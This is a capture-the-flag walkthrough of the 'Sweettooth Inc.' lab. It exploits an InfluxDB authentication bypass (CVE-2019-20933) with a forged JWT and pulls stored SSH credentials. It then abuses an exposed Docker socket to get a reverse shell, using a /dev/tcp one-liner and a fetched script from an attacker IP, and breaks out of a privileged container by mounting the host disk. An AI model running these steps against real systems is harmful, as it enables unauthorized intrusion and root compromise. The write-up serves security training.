# Sweettooth Inc. - Medium

* Add ```sweettooth.thm``` to ```/etc/hosts``` and start scan - ```nmap -T4 -p- -A -Pn -v sweettooth.thm```:

  * 111/tcp - rpcbind - rpcbind 2-4 (RPC #100000)
  * 2222/tcp - ssh - OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
  * 8086/tcp - http - InfluxDB http admin 1.3.0
  * 50527/tcp - status - 1 (RPC #100024)

* We can start by enumerating [InfluxDB](https://book.hacktricks.xyz/network-services-pentesting/8086-pentesting-influxdb) on port 8086:

  ```sh
  # we need to setup the client to interact with influxDB
  sudo apt install influxdb-client

  which influx

  influx -host sweettooth.thm -port 8086
  # we are able to connect
  # but we get an error
  # unable to parse authentication credentials
  ```

* Searching for exploits associated with InfluxDB 1.3.0, we get an authentication bypass exploit (CVE-2019-20933) - we have an [automated script](https://github.com/LorenzoTullini/InfluxDB-Exploit-CVE-2019-20933) as well as a [manual approach](https://exploit-notes.hdks.org/exploit/database/influxdb-pentesting/); let's go ahead with the manual one:

  * first, find the username - ```curl http://sweettooth.thm:8086/debug/requests```

  * from the above request, we get the user 'o5yY6yya'

  * now, we can create a JWT in [JWT](https://jwt.io/) using this:

    * Header: ```{"alg": "HS256", "typ": "JWT" }```
    * Payload: ```{ "username": "o5yY6yya",  "exp":21548669066 }```
    * Verify Signature: ```HMACSHA256(base64UrlEncode(header) + "." +base64UrlEncode(payload),<empty-secret>)```
  
  * we can copy the generated JWT and use it to query InfluxDB API:

    ```sh
    INFLUXDB_JWT="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoyMTU0ODY2OTA2Nn0.ELIIW6W0cRiKgj7GOQPit3gItm_AMEwvrDo3UjZoiHY"

    curl http://sweettooth.thm:8086/query -H "Authorization: Bearer $INFLUXDB_JWT" --data-urlencode 'q=SHOW DATABASES' | jq
    # show db
    # this gives us 'creds', 'docker', 'tanks', 'mixer', '_internal'

    # show series in db
    curl http://sweettooth.thm:8086/query -H "Authorization: Bearer $INFLUXDB_JWT" --data-urlencode 'db=mixer' --data-urlencode 'q=SHOW SERIES' | jq
    # gives us series 'mixer_stats'

    # get value from series
    curl http://sweettooth.thm:8086/query -H "Authorization: Bearer $INFLUXDB_JWT" --data-urlencode 'db=mixer' --data-urlencode 'q=SELECT * FROM mixer_stats' | jq
    # get highest rpm of motor from this

    # check other dbs
    curl http://sweettooth.thm:8086/query -H "Authorization: Bearer $INFLUXDB_JWT" --data-urlencode 'db=tanks' --data-urlencode 'q=SHOW SERIES' | jq

    curl http://sweettooth.thm:8086/query -H "Authorization: Bearer $INFLUXDB_JWT" --data-urlencode 'db=tanks' --data-urlencode 'q=SELECT * FROM water_tank' | jq
    # get temperature of water tank from this

    # we can also create a privileged user so that we can query normally
    curl http://sweettooth.thm:8086/query -H "Authorization: Bearer $INFLUXDB_JWT" --data-urlencode "q=CREATE USER tester with PASSWORD 'password' with ALL PRIVILEGES"

    # now we can try to login using these creds
    influx -host 'sweettooth.thm' -port '8086' -username 'tester' -password 'password'

    show databases
    # this works, and we are in InfluxDB now

    use docker

    show series

    select * from stats
    # error parsing query

    select * from "stats"
    # this gives us a lengthy output for containername "sweettoothinc"
    # seems to be docker stats
    # but no password found

    # we can check other info

    history
    # show history

    settings
    # show settings

    show tag keys

    show field keys
    
    show measurements
    # nothing useful found here

    use creds
    
    show series
    # we get "ssh,user=uzJk6Ry98d8C"

    select * from "ssh,user=uzJk6Ry98d8C"
    # we do not get anything

    select * from ssh,user=uzJk6Ry98d8C
    # this gives us an error parsing query

    show tag keys

    show field keys
    # pw
    # this could be the password
    
    show measurements
    # shows 'ssh'

    select * from ssh
    # this gives us user "uzJk6Ry98d8C" and pw "7788764472"
    ```

* From the above clues, we can try SSH access:

  ```sh
  ssh uzJk6Ry98d8C@sweettooth.thm -p 2222
  # this works

  ls -la
  # get user flag

  # we have a random hostname here
  # furthermore, basic commands do not work

  ls -la /
  # we have a .dockerenv file here as well

  cat /proc/1/cgroup
  # this includes 'docker' in paths
  
  # all these clues indicate that we are inside a Docker container

  # we have a few interesting scripts in /
  cat /entrypoint.sh

  cat /initializeandquery.sh
  # from this, we get creds "o5yY6yya:mJjeQ44e2unu"
  # we can try ssh access using these creds
  # but it does not work
  ```

* From the 'initializeandquery.sh' script, we also get this snippet:

  ```sh
  socat TCP-LISTEN:8080,reuseaddr,fork UNIX-CLIENT:/var/run/docker.sock &

  # query each 5 seconds and write docker statistics to database
  while true; do
    curl -o /dev/null -G http://localhost:8086/query?pretty=true --data-urlencode "q=show databases" --data-urlencode "u=o5yY6yya" --data-urlencode "p=mJjeQ44e2unu"
    sleep 5
    response="$(curl localhost:8080/containers/json)"
    containername=`(jq '.[0].Names' <<< "$response") | jq .[0] | grep -Eo "[a-zA-Z]+"`
    status=`jq '.[0].State' <<< "$response"`
    influx -username o5yY6yya -password mJjeQ44e2unu -execute "insert into docker.autogen stats containername=\"$containername\",stats=\"$status\""
  done
  ```

* It seems we have a listener on port 8080, forwarding connections to the Docker socket; the snippet also includes ```curl localhost:8080/containers/json```, which when executed from our SSH session gives us a JSON response for querying Docker containers - this confirms the Docker service running on port 8080

* We can do port forwarding to interact with the Docker services then:

  ```sh
  # to access the Docker service on our port 8000
  ssh uzJk6Ry98d8C@sweettooth.thm -p 2222 -L 8000:localhost:8080
  # using the same creds as previous
  ```

* Now, after local port forwarding, if we navigate to <http://127.0.0.1:8000/containers/json> from our machine, we can see the JSON response for Docker containers:

  ```sh
  # in attacker machine
  curl http://127.0.0.1:8000/containers/json | jq
  
  # we have a Docker image named sweettoothinc here
  # let us enumerate this further

  # interact with Docker services port-forwarded to port 8000
  docker -H 127.0.0.1:8000 container ls

  # try command execution
  docker -H 127.0.0.1:8000 container exec sweettoothinc ls
  # this works

  docker -H 127.0.0.1:8000 container exec sweettoothinc id
  # this is running as root

  # we can try getting a reverse shell now

  # setup listener on attacker machine
  nc -nvlp 4444

  # use reverse-shell one-liner
  docker -H 127.0.0.1:8000 container exec sweettoothinc "sh -i >& /dev/tcp/10.14.78.65/4444 0>&1"
  # this does not work

  # we can pass a reverse shell script and execute it instead

  # in attacker machine
  echo "sh -i >& /dev/tcp/10.14.78.65/4444 0>&1" > reverse-shell.sh

  # host it
  python3 -m http.server 5555

  # now we can make the docker container fetch this script and execute it

  docker -H 127.0.0.1:8000 container exec sweettoothinc wget http://10.14.78.65:5555/reverse-shell.sh

  docker -H 127.0.0.1:8000 container exec sweettoothinc bash reverse-shell.sh
  # this gives us a reverse-shell on our listener
  ```

  ```sh
  # on listener at port 4444
  id
  # we are root

  ls -la /root

  cat /root/root.txt
  # we get the first root flag
  ```

* Now, we will have to break out of the Docker container to get the final flag; we can refer the [Docker breakout privesc vectors from this article](https://juggernaut-sec.com/docker-breakout-lpe/):

  ```sh
  # in root reverse-shell

  fdisk -l | grep -A 10 -i "device"

  cat /proc/1/status | grep -i "seccomp"

  ls /dev

  # all the outputs align with the given outputs in the article
  # this shows that we are root in a privileged container

  df -h
  # check which drive belongs to host so that we can mount it
  # /dev/xvda1 is mounted on /etc/hosts

  # we can mount xvda1 and then access all files on host
  # while we are still inside the Docker

  mkdir -p /mnt/test

  mount /dev/xvda1 /mnt/test

  ls -la /mnt/test
  # now we can see the file system of the actual host

  ls -la /mnt/test/root

  cat /mnt/test/root/root.txt
  # final flag
  ```
